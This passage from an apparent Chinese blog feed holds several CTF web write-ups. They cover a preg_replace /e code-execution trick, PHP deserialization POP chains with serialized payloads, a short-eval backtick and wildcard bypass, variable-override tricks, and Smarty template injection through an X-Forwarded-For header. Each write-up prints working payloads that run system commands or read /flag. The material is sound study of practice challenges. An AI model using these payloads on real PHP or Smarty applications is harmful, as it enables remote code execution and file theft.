</p><pre><code>&lt;?php$id = $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] = $id;function complex($re, $str) &#123;return preg_replace(    &#39;/(&#39; . $re . &#39;)/ei&#39;,    &#39;strtolower(&quot;\\1&quot;)&#39;,    $str);&#125;foreach($_GET as $re =&gt; $str) &#123;echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;@eval($_GET[&#39;cmd&#39;]);&#125;</code></pre><p>这个才是重头，一眼看到里面的eval()函数，这是我们读取flag文件的关键，我们通过上传cmd参数来执行命令，而上面的正则匹配会返回最后匹配后的值，但是我们注意到，这个正则匹配和之前见过的有点不太一样。  </p><pre><code>/e 修正符使 preg_replace() 将 replacement 参数（第二个参数，字符串）当作 PHP 代码执行。</code></pre><p>也就是说我们传入的字符串在匹配后，它的第二个参数会被当作php代码执行，一般情况下，第二参数是用于替换的字符串或字符串数组，而这里却是’strtolower(“\\1”)’这样的字符串，有点不寻常，查一下什么意思。  </p><pre><code>反向引用对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#39;\n&#39; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。\\1也就表示\1，\1表示取出正则匹配后的第一个子匹配中的第一项，strtolower()的作用是把大写字母转换为小写字母。</code></pre><p>所以说这里第二个参数就是我们匹配后的第一个子匹配中的第一项。  </p><p>而正则匹配里的$re和$str是通过foreach($_GET as $re =&gt; $str)历遍上传的，也就是说如果我们上传index.php?hello=world那么$re=hello，$str=world（关于foreach()函数可以看之前的一篇博客详解）。 </p><p>所以说上面的正则匹配也就相当于eval(‘strtolower(“\1”);’)，这里的\\1也就是我们上传的$str,所以最后就是eval(‘strtolower(“$str”);’)。所以只要我们构造好$str就可以执行命令。  </p><p>而我们前面已经注意到了代码中的getFlag()函数，这个函数是我们最终要利用的函数。</p><p>那么我们就可以这样构造payload。  </p><pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></pre><p>我们来解释一下这个payload。  </p><p>首先是传入的参数\S* ，在官方的漏洞利用中，给出的是.* 作为参数上传，但是在php中当非法字符为首字母时，只有点号会被替换成下划线，所以这里改为\S* 。  </p><p>其次就是我们为什么传入的的是${getFlag()}而不是直接传入getFlag()，这里有关php的可变变量。  </p><pre><code>在php中，双引号里面如果包含有变量，php解释器会进行解析；单引号中的变量不会被处理。  </code></pre><p>而我们看到strtolower(“\1”)中的\\1是被双引号括起来的，这也就是说我们如果直接上传getFlag()，那么结果就是strtolower(“getFalg()”)，输出的就是字符串，而不会执行getFlag()函数所以我们要上传${getFlag()}，而$$a = ${$a}，这样在经过双引号的解析后剩下的getFlag()就仍是函数，可以被eval()执行。  </p><p>最后我们上传cmd作为getFlag()的参数，执行命令，从而得到flag。（注意是在next.php页面上传。）  </p><p><a href="https://img.imgdb.cn/item/6066cbdd8322e6675cd02d67.png"><img src="https://img.imgdb.cn/item/6066cbdd8322e6675cd02d67.png"></a></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考察的知识点挺多的，首先是php伪协议的运用，然后又考察了常见的replace()的漏洞的运用，同时又考察了可变变量，这个漏洞挺少见的，还是要多做积累，以防以后遇到不认识。  </p><p>附上关于这个漏洞的详细讲解。  </p><p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p>]]></content>
      
      
      <categories>
          
          <category> test56 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化——pop链2</title>
      <link href="test55/undefined-undefined.html"/>
      <url>test55/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天再复习一道php反序列化的题目，锻炼自己构造pop链的能力。  </p><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>打开题目，直接就得到了源码。  </p><pre><code> &lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;protected  $var;public function append($value)&#123;    include($value);&#125;public function __invoke()&#123;    $this-&gt;append($this-&gt;var);&#125;&#125;class Show&#123;public $source;public $str;public function __construct($file=&#39;index.php&#39;)&#123;    $this-&gt;source = $file;    echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;&#125;public function __toString()&#123;    return $this-&gt;str-&gt;source;&#125;public function __wakeup()&#123;    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker&quot;;        $this-&gt;source = &quot;index.php&quot;;    &#125;&#125;&#125;class Test&#123;public $p;public function __construct()&#123;    $this-&gt;p = array();&#125;public function __get($key)&#123;    $function = $this-&gt;p;    return $function();&#125;if(isset($_GET[&#39;pop&#39;]))&#123;@unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;$a=new Show;highlight_file(__FILE__);&#125;   </code></pre><p>代码很长，但是根据我们之前做题的思路，首先就是找到可以执行命令的代码或者函数。  </p><p>可以看到在Modifier类中就有一个include()函数，推测我们可以用这个函数来执行include()文件包含漏洞。  </p><pre><code>class Modifier &#123;protected  $var;public function append($value)&#123;    include($value);&#125;public function __invoke()&#123;    $this-&gt;append($this-&gt;var);&#125;&#125;  </code></pre><p>可以看到，include()函数里的变量$value是在下面的_invoke()方法中被赋值的，从之前的那道题目中可以知道，如果把一个类的对象当作函数调用，那么就会触发invoke()方法，而这个方法会调用一个自定义的方法，将把保护属性$var传入自定义方法append($value)，也就是将var的值赋予value，所以我们要想执行include()函数，就要给var传入参数。  </p><p>那么我们如何触发_invoke()方法呢？这里我们可以看到下面的test类里有可用的函数。  </p><pre><code>class Test&#123;public $p;function __construct()&#123;$this-&gt;p = array();&#125;public function __get($key)&#123;$function = $this-&gt;p;return $function();&#125;  </code></pre><p>很明显，在Test类里的_get()方法会将p的值赋予$function并返回形如函数的形式$function()，而get()方法只会在访问不可访问或者不存在的属性的时候才会触发那么从哪里找一个不存在的属性呢？  </p><p>这就要看到Show类了。</p><pre><code>class Show&#123;public $source;public $str;public function __construct($file=&#39;index.php&#39;)&#123;    $this-&gt;source = $file;    echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;&#125;public function __toString()&#123;    return $this-&gt;str-&gt;source;&#125;public function __wakeup()&#123;    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker&quot;;        $this-&gt;source = &quot;index.php&quot;;    &#125;&#125;&#125;</code></pre><p>首先可以看到的是这个wakeup()方法，在反序列化开始的时候就会调用这个函数，而这个函数里又有一个正则匹配，匹配的是属性source，<strong>在这里要注意一下，在正则匹配时，是把属性source当作字符串来处理的。</strong>这让我们很容易就联系到上面的tostring_()方法，当一个类对象被当作字符串处理的时候，这个方法就会被返回。这里返回的$this-&gt;str-&gt;source;指的是返回str属性值的source属性，而这个source属性不正好就是Test类里没有的属性吗？  </p><p>所以到了这里我们大致就可以理出pop链了：  </p><p>我们首先从Show类开始，先触发wakeup方法，在wakeup的正则匹配中触发tostring方法，我们给str赋值Test()类，这样返回的就是Test类的source属性，而Test类里没有该属性，从而触发了get()方法，在get方法中我们给p赋值为Modifier类，这样最后返回的就是Modifier()，这样就是把类对象当作函数了，从而可以触发invoke()方法，而我们通过上传var参数来利用include()的文件包含漏洞。  </p><pre><code>unserialize()--&gt;__wakeup()--&gt;toString()--&gt;__get()--&gt;__invoke()--&gt;append()--&gt;include()  </code></pre><p>我们这样构造  </p><pre><code>&lt;?phpclass Modifier &#123;protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;//伪协议利用include()函数漏洞。&#125;class Test&#123;public $p;    &#125;class Show&#123;public $source;public $str;public function __construct()&#123;    $this-&gt;str = new Test();&#125;&#125;$a = new Show();$a-&gt;source = new Show();//这里是一个要注意的点，因为tostring()是在wakeup()方法中触发的，而这时匹配的是$source,所以我们要给source赋值show()类以此来进行接下来的tostring()方法。$a-&gt;source-&gt;str-&gt;p = new Modifier();//__get返回的p触发__invokeecho serialize($a);?&gt;得到O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot; * var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;N;&#125;&#125;</code></pre><p>由于var是protected类型，所以payload中需要用%00把它的位数补齐，或者直接最后url编码输出<br>最后传入pop得到base64编码，解码即得flag。  </p><p><a href="https://img.imgdb.cn/item/6064ac528322e6675cf319a5.png"><img src="https://img.imgdb.cn/item/6064ac528322e6675cf319a5.png"></a>  </p><p>解码可得。  </p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题目虽然代码大变样，但是思路不变，依旧是找可以执行命令的语句和能够操控的pop链，只要对魔术方法足够了解，代码审计能力足够强就可以做到。所以说还是要多加练习啊。</p>]]></content>
      
      
      <categories>
          
          <category> test55 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化——pop链</title>
      <link href="test54/undefined-undefined.html"/>
      <url>test54/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这星期实验室有一道php反序列化的题目，主要考察了一些魔法函数的调用和对pop链的构造，正好前几次比赛也是经常考察了这一知识点，所以特意做了几道php反序列化的题目，来真正学习一下这个重要的知识点。  </p><h1 id="ppppp"><a href="#ppppp" class="headerlink" title="ppppp"></a>ppppp</h1><p>打开题目，看到代码：  </p><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);class A&#123;public $A1;public $A2;public function __call($name,$param)&#123;    if($this-&gt;&#123;$name&#125;)        &#123;            $A3 = $this-&gt;&#123;$name&#125;;            $A3();        &#125;&#125;public function __get($wuhu)&#123;    return $this-&gt;A2[$wuhu];&#125;&#125;class B&#123;public $B1;public $B2;public function __destruct()&#123;    $this-&gt;B1-&gt;godmi();&#125;&#125; class C&#123;public $C1;public $C2;public $C3;public function __invoke()&#123;    $this-&gt;C2 = $this-&gt;C3.$this-&gt;C1;&#125; &#125;class D&#123;public $D1;public function FLAG()&#123;    system($this-&gt;D1);&#125;&#125;class E&#123;public $E1;public $E2;public function __toString()&#123;    $this-&gt;E1-&gt;&#123;$this-&gt;E2&#125;();    return &quot;1&quot;;&#125;&#125;$ppppp = $_POST[&#39;Troy3e&#39;];unserialize($ppppp);?&gt;  </code></pre><p>代码挺长的，但是并不难理解，简单的代码审计一下可以看到这道题目不像我们之前做过的只有一个类，然后直接反序列化得到结果那样了。而是有不少类共同组成的，也就是说，如果我们想要得到最后结果，就要考虑到这些类的练习，这时候就需要构造pop链了。  </p><p>简单的说pop链就是在反序列化中利用一些函数或者变量的设计漏洞，然后将这些漏洞串联起来，形成一条链，最后达到控制我们可以控制的参数来进行rec等操作。  </p><p>那么我们就先来看一下代码中什么变量参数是我们想要控制的。可以看到，在D类中，有一个命令执行函数system($this-&gt;D1)。这个所以说这个D1就是我们要控制输入的参数了。  </p><p>我们可以进一步看到这个D类中有一个FLAG()函数，而我们要想调用这个函数，就必须要使用E类中的__toString() 方法。  </p><pre><code>__toString方法，当前对象访问str再访问source，然后返回这个值，就是把类当作字符串使用时触发  </code></pre><p>而关于E类的代码如下：  </p><pre><code>class E&#123;public $E1;public $E2;public function __toString()&#123;    $this-&gt;E1-&gt;&#123;$this-&gt;E2&#125;();    return &quot;1&quot;;&#125;&#125; </code></pre><p>也就是说，我们将E类当作字符串使用，然后给E2赋值为FLAG，这样它最后输出的就是FLAG(),从而就可以执行D中的函数，那么我们如何触发E类的__toString() 方法呢？  </p><p>可以看到在C类中有这样一串代码  </p><pre><code>public function __invoke()&#123;    $this-&gt;C2 = $this-&gt;C3.$this-&gt;C1;&#125;  </code></pre><p>这里的$this-&gt;C3.$this-&gt;C1;是将C3和C1当作字符串连接起来，那么我们就可以利用这里来让E类被当作字符串，从而输出我们的FLAG()。  </p><p>那么问题又来了，可以看到这传代码是在__invoke()方法里的，那我们要如何触发这个方法呢？  </p><pre><code>__invoke()魔术方法：在类的对象被调用为函数时候，自动被调用  </code></pre><p>也就是说当我们这样调用**E(“这里是参数，可以不填”)**，也就是将E类当作函数使用的时候，这个方法就可以触发，那么接下来就是找一下哪里可以实现吧E类转化成函数形式了。  </p><p>可以看到A类代码中有这样的代码  </p><pre><code>public function __call($name,$param)&#123;    if($this-&gt;&#123;$name&#125;)        &#123;            $A3 = $this-&gt;&#123;$name&#125;;            $A3();        &#125;&#125;       public function __get($wuhu)&#123;    return $this-&gt;A2[$wuhu];&#125;</code></pre><p>可以看到A3后面加上了一个括号，使A3变成了函数形式，所以说我们如果可以让A3=E类，那么就能成功。如何做到这一点呢，可以看到A类中有两个魔术函数  </p><pre><code>__get()魔术方法：从不可访问的属性中读取数据会触发  __call():在对象中调用一个不可访问方法时，__call() 会被调用。  </code></pre><p>可以看到如果我们调用了一个不存在的函数就能触发_call()方法，而这个方法括号中有两个参数反别是不存在的方法名称和方法参数，例如：  </p><p>调用不存在函数test(123),那么_call($name,$param)中的$name=test，$param=123。  </p><p>那么接下来就是让A3赋值为E类，这就要用到_get()方法了。当我们访问一个不可访问的属性的时候（<strong>不存在的属性也是不可访问的哦</strong>），就会调用这个函数，而get()里的参数就是接受那个属性，而可以看到当get()方法接受了那个不可访问的属性后，会将这个属性重新赋值然后再返回给$name,最后赋值给A3，形成函数形式，那么我们不就可以控制我们输入的的值并且使它等于E类了吗？  </p><p>那么就来到最后一步了，我们如何触发这个A类里的函数呢？可以看到B类里的函数  </p><pre><code>class B&#123;public $B1;public $B2;public function __destruct()&#123;    $this-&gt;B1-&gt;godmi();&#125;&#125;    </code></pre><p>__destruct()这个方法是老熟客了。当我们摧毁一个属性的值的时候就会调用这个函数，而当我们改变一个属性的值的时候也会触发，我们可以看到，这个方法如果触发，那么他就会给B1赋值为一个godmi()函数，这个函数正好可以触发A类里的call()方法和get()方法（<strong>因为我们要访问的是A类里的godmi()属性，而这个是A类中所没有的</strong>），这不就是我们想要的吗。而这个B1变量完全可以控制，这就满足了我们构造pop链的条件。  </p><p>那么我们来整理一下大致的pop链吧。  </p><pre><code>B()-&gt;B1=A()A()-&gt;A2=C()C()-&gt;C3=E(),C1=&quot;一串字符串&quot;(只有C1,C3都是字符串才能进行连接)E()-&gt;E1=D()，E2=&quot;FLAG&quot;D()-&gt;D1=要执行的命令；  </code></pre><p>然后就是代码打印出序列化后的pop链：  </p><pre><code>&lt;?phpclass A&#123;    public $A1;    public $A2;    public function __construct()    &#123;     $this-&gt;A2[&#39;godmi&#39;]=new C();    &#125;&#125; class B&#123;    public $B1;    public $B2;    public function __construct()    &#123;        $this-&gt;B1=new A();    &#125;&#125; class C&#123;    public $C1;    public $C2;    public $C3;    public function __construct()    &#123;        $this-&gt;C1=new E();        $this-&gt;C3=&#39;www&#39;;    &#125; &#125;class D&#123;    public $D1;    public function __construct()    &#123;        $this-&gt;D1=&quot;ls&quot;;    &#125;&#125;class E&#123;    public $E1;    public $E2;    public function __construct()    &#123;        $this-&gt;E1=new D();        $this-&gt;E2=&#39;FLAG&#39;;    &#125;&#125; $b=new B();$x=serialize($b);echo $x;?&gt;  </code></pre><p>得到序列化后的字符串  </p><pre><code>O:1:&quot;B&quot;:2:&#123;s:2:&quot;B1&quot;;O:1:&quot;A&quot;:2:&#123;s:2:&quot;A1&quot;;N;s:2:&quot;A2&quot;;a:1:&#123;s:5:&quot;godmi&quot;;O:1:&quot;C&quot;:3:&#123;s:2:&quot;C1&quot;;O:1:&quot;E&quot;:2:&#123;s:2:&quot;E1&quot;;O:1:&quot;D&quot;:1:&#123;s:2:&quot;D1&quot;;s:2:&quot;ls&quot;;&#125;s:2:&quot;E2&quot;;s:4:&quot;FLAG&quot;;&#125;s:2:&quot;C2&quot;;N;s:2:&quot;C3&quot;;s:3:&quot;www&quot;;&#125;&#125;&#125;s:2:&quot;B2&quot;;N;&#125;  </code></pre><p>然后通过命令查看flag文件就行了。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>关于pop链的考察其实还是考察的代码审计能力，要能从代码中找到可以利用的函数或者参数，通过一步步的倒推或者正推来完善一条pop链，最后编写代码打印出pop链。在这中题目中重点就是对于魔术函数的理解和运用，这种题还是要多做，以后的比赛中一般不会再出现之前那样简单的反序列化题目了。</p>]]></content>
      
      
      <categories>
          
          <category> test54 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nepctf总结1</title>
      <link href="test53/undefined-undefined.html"/>
      <url>test53/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这几天来总结一下这次nepctf里的题目，先不做buuctf了，毕竟新题更有价值。  </p><h1 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h1><p>这是一道签到题，打开题目得到源码。  </p><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);$nep = $_GET[&#39;nep&#39;];$len = $_GET[&#39;len&#39;];if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13)&#123;    eval(substr($nep,0,$len));&#125;else&#123;    die(&#39;too long!&#39;);&#125;?&gt;   </code></pre><p>可以看到代码很简单，上传两个变量，然后对nep变量进行截取，长度是len变量上传的值，最后eval()命令执行函数执行的就是截取后的nep变量中的字符串。  </p><p>但是可以从源码中看到，nep变量的长度限制为13个字符以内，而len则是要求数字是8以下，这就说明使用system()函数来实现命令执行不可能了，所以这里用到反引号``来进行命令执行。  </p><p>关于反引号执行命令语句其实在之前的题目中遇到很多次了，不算难点。接下来才是重点。  </p><p>如果我们直接构造<br>    ?nep= ``ls`;&amp;len=7 </p><p>是不会显示目录的，具体原因不知，那么我们要怎么样才能读取到flag文件的内容呢？这要用到linux中的一些符号命令。  </p><p>首先构造  </p><blockquote><p>?nep=``ls&gt;z`;&amp;len=7</p></blockquote><p>这里的&gt;指的是新建一个文件并写入这个文件的意思，所以这个payload做的就是新建一个z文件，并且把ls得到的所有目录都写入这个z文件。  </p><p>然后我们再构造  </p><blockquote><p>?nep=``&gt;cat`;&amp;len=7  </p></blockquote><p>同上面的一样，我们构造一个cat文件，但是我们并没有向这个文件写入东西。  </p><p>接下来是最重要的，我们这样构造：  </p><blockquote><p>?nep=``*&gt;z`;&amp;len=7  </p></blockquote><p>这里我们看到有一个通配符*,在linux中，这个符号表示把第一个列出的文件名当作命令，把剩下的文件名当作参数。而在linux中，文件是按照小写字母到大写字母来排序的，所以现在的文件顺序应该是cat 。。（包含flag的文件）。。。 z，所以说最后执行的语句是cat 。。。。 z&gt;z  </p><p>也就是把网站下的文件读出来并写入z文件中，那么接下来我们只需要访问z文件就可以了。  </p><p>另外这道题也可以这样构造  </p><blockquote><p>?nep=``$nep`;ls&gt;z&amp;len=7.</p></blockquote><p>原因是程序虽然会因为变量未定义出现警告，但是仍能通过反引号来执行命令。操作和上面方法一样。  </p><p>但是这道题我在实际做的时候却无法读取z文件，构造?nep=``cat z`;&amp;len=7无法生效，不知道原因是什么。 </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考的是反引号执行命令语句和linux一些符号的使用，前者掌握的还可以但是后者明显有些生疏了，对于linux里的一些符号是会经常拿出来考的，所以说还是要多积累，多见。</p>]]></content>
      
      
      <categories>
          
          <category> test53 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习11——变量覆盖回顾</title>
      <link href="test52/undefined-undefined.html"/>
      <url>test52/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天这道题是很久之前就做过的一道题目了，考的是变量覆盖。  </p><h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>打开题目，发现是个人简介的网站，f12一通后发现没有任何提示，于是先使用dirsearch扫一下网站可以知道是.git文件泄露，于是可以使用githack来下载下来源码。  </p><p><a href="https://img.imgdb.cn/item/6058c1268322e6675cbfb541.png"><img src="https://img.imgdb.cn/item/6058c1268322e6675cbfb541.png"></a>  </p><p>扫完可以发现有一个index.php文件和flag.php文件，关于flag.php文件写的就是一行文件读取flag文件的代码，主要还是看index.php里的文件。（另外我做题的时候并没有找到flag.php文件在哪。）  </p><p>下面是index.php文件的源码。  </p><pre><code>&lt;?phpinclude &#39;flag.php&#39;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#39;yds&#39;;foreach($_POST as $x =&gt; $y)&#123;$$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123;$$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123;if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;    exit($handsome);&#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;exit($yds);&#125;if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;exit($is);&#125;echo &quot;the flag is: &quot;.$flag;  </code></pre><p>在代码中我们可以看到foreach()函数和$$符号的使用，很容易就想到了变量覆盖漏洞，关于foreach()详细讲解可以参考之前我的一篇博客。  </p><p>可以看到这道题我们只用get方式传参就能解决问题，而且解法很多：  </p><h2 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h2><p>我们可以看到下面这串代码  </p><pre><code>foreach($_POST as $x =&gt; $y)&#123;$$x = $y;&#125;    foreach($_GET as $x =&gt; $y)&#123;$$x = $$y;&#125;  if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;exit($yds);&#125;  </code></pre><p>很明显，第二段代码告诉我们如果我们没有传入flag变量，那么就会返回yds变量里面的值，那么我们就可以使用$$让原本变量flag里的值赋予yds,经过foreach()函数，$$x也就是$$yds，$$y是$$flag，，最后的结果就是$yds=$flag,$$yds可以看作$($yds)相当于给变量$yds赋值。  </p><p>这样下来，既满足了我们没有上传flag变量，又将$flag里的值赋予了$yds，这样就能返回$yds,而返回的$yds就是flag。  </p><p><a href="https://img.imgdb.cn/item/6058c58f8322e6675cc33312.png"><img src="https://img.imgdb.cn/item/6058c58f8322e6675cc33312.png"></a>  </p><h2 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h2><p>我们可以看到后面还有一串返回$is值的代码。  </p><pre><code>if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;exit($is);&#125;  </code></pre><p>这段代码说明我们通过post或者get方式上传变量flag，并且如果flag内容是字符串”flag”的话就可以返回变量$is的值。  </p><p>这就和我之前做的那道变量覆盖题很像了。我们首先构造/?is=flag使$flag里的值赋予$is，为了让我们最后返回的$is是flag。然后我们再构造flag=flag,这样我们就满足了if语句中的flag===’flag’，这样就会返回$is的值，从而得到flag.  </p><p><a href="https://img.imgdb.cn/item/6058cbff8322e6675cc74e32.png"><img src="https://img.imgdb.cn/item/6058cbff8322e6675cc74e32.png"></a>  </p><p>但是如果按照之前那道题我们使用post方式上传flag=flag并不行，目前还不是很清楚原因。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考的知识点并不难，但是很久没做过变量覆盖题这次遇见还是有点不熟悉了，由此看来及时复习还是很重要的。  </p><p><a href="https://george186.github.io/note1/undefined-undefined.html">PHP中foreach函数笔记</a><br><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> test52 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习10——smarty的SSTI注入</title>
      <link href="test51/undefined-undefined.html"/>
      <url>test51/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天复习一下ssti注入，这个注入在ctf中还是很重要的，是必须要掌握的。  </p><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>打开题目，看到页面，在上方发现有flag选项，点一下看看是什么。  </p><p><a href="https://img.imgdb.cn/item/60576b4c8322e6675c12e7f0.png"><img src="https://img.imgdb.cn/item/60576b4c8322e6675c12e7f0.png"></a>  </p><p>发现显示的是本机的ip地址，结合题目可以知道这道题目应该和ip地址有关，那我们先想到的就是xxf伪造ip地址，那就先抓个包看看。  </p><p>输入X-Forwarded-For:127.0.0.1来伪造地址。  </p><p><a href="https://img.imgdb.cn/item/60576d368322e6675c142c3c.png"><img src="https://img.imgdb.cn/item/60576d368322e6675c142c3c.png"></a>  </p><p>可以看到确实有效果，我们上传的ip地址被回显显示出来，但是这样对于我们来说并没有什么用。但是通过我们上传的ip地址被返回到界面上这一现象我们可以想到ssti注入，关于ssti注入详细解释可以看我之前的一篇博客。  </p><p>那么我们可以先测试一下是否和我们想的一样。  </p><p>输入X-Forwarded-For:127.0.0.149。  </p><p><a href="https://img.imgdb.cn/item/60576e3d8322e6675c14e320.png"><img src="https://img.imgdb.cn/item/60576e3d8322e6675c14e320.png"></a>  </p><p>可以看到回显的ip地址是127.0.0.149，这说明确实是ssti注入。但是这道题目和之前我做到的ssti注入也有些不同的地方。  </p><p><a href="https://img.imgdb.cn/item/60576ec28322e6675c1554aa.png"><img src="https://img.imgdb.cn/item/60576ec28322e6675c1554aa.png"></a>  </p><p>可以看到，当我们按照之前的ssti步骤走的时候，它却会报错，说明这次题目所用的引擎是一个新的引擎。  </p><p>通过查看别人的wp和一些文章，知道了这道题目其实用的是smarty模板引擎，而这个引擎的ssti手段和我们常见的flask的ssti手段还是有很大区别的。  </p><p>具体的讲解就不多说了，会在下面附上博客。下面说一下常规的利用方式：  </p><pre><code>1、Smarty支持使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。  2、&#123;literal&#125; 标签官方手册这样描述这个标签：&#123;literal&#125;可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。那么对于php5的环境我们就可以使用&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;来实现PHP代码的执行.（php7环境就会失效）  3、&#123;if&#125;标签(对于php7环境)官方文档中看到这样的描述：Smarty的&#123;if&#125;条件判断和PHP的if 非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;. 也可以使用&#123;else&#125; 和 &#123;elseif&#125;. 全部的PHP条件表达式和函数都可以在if内使用，如*||*, or, &amp;&amp;, and, is_array(), 等等既然全部的PHP函数都可以使用，那么我们是否可以利用此来执行我们的代码呢？将XFF头改为&#123;if phpinfo()&#125;&#123;/if&#125;，可以看到执行了phpinfo()。  </code></pre><p>这里我们使用第三种方法，先构造127.0.0.1{if system(“ls /“)}{/if}查看根目录，因为一般flag都在根目录里。  </p><p><a href="https://img.imgdb.cn/item/605773158322e6675c187268.png"><img src="https://img.imgdb.cn/item/605773158322e6675c187268.png"></a>  </p><p>成功了，可以看到flag，接下来就是查看flag内容了，构造127.0.0.1{if system(“cat /flag”)}{/if}就可以得到flag。  </p><p>看了别人的wp，发现{system(“cat /flag”)}这样也能成功注入，算是长了新知识吧。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目考的都是之前见过的，但是还是不容易做的，首先要先想到ip回显和ssti注入有关，然后还要知道smarty引擎注入方式，也就是说要对ssti的了解比较熟悉才行。通过这道题，我也是知道了一种新的ssti注入方式。  </p><p>关于smarty模板引擎ssti注入方法博客：<br><a href="https://www.freebuf.com/column/219913.html">Smarty SSTI</a></p>]]></content>
      
      
      <categories>
          
          <category> test51 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习9</title>
      <link href="test50/undefined-undefined.html"/>
      <url>test50/undefined-undefined.html</url>
      
